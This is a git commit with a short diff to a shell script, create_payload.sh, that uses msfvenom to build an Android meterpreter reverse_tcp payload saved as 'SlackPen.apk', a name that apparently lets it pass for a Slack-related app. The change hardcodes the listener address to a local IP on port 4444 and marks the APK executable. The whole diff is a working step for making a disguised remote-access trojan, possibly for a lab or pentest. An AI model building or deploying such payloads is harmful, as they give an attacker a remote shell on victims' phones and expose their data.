597dfa1476e134fc8f7a56d8fb75373767f1086a
ChooseYourPlan <timweissenfels7@gmail.com>
2019-10-23 03:41:48 +0200

    Changed Dynamic IP to Static

--- create_payload.sh
+++ create_payload.sh
@@ -1,2 +1,3 @@
 #!/bin/sh
-sudo msfvenom -p android/meterpreter/reverse_tcp LHOST=$1 LPORT=4444 R > SlackPen.apk
+sudo msfvenom -p android/meterpreter/reverse_tcp LHOST="192.168.0.214" LPORT=4444 R > SlackPen.apk
+sudo chmod +x SlackPen.apk
